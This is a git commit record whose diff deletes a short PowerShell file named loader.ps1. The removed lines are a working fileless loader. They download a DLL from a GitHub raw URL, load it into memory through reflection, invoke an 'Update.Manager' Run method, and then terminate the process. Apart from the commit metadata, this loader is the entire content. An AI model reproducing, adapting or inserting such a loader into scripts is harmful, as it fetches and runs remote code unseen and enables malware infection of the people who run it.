fa00c9622aa9bb16bc3f5118f36af43bce9fa1be
dps <7b1eahh@gmail.com>
2026-03-05 15:42:39 -0300

    Delete loader.ps1

--- loader.ps1
+++
@@ -1,4 +0,0 @@
-[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
-$b=(New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/7b1eahh-lang/Hero/main/Payload.dll")
-[Reflection.Assembly]::Load($b).GetType("Update.Manager").GetMethod("Run").Invoke($null,@(,[string[]]@()))
-[System.Diagnostics.Process]::GetCurrentProcess().Kill()
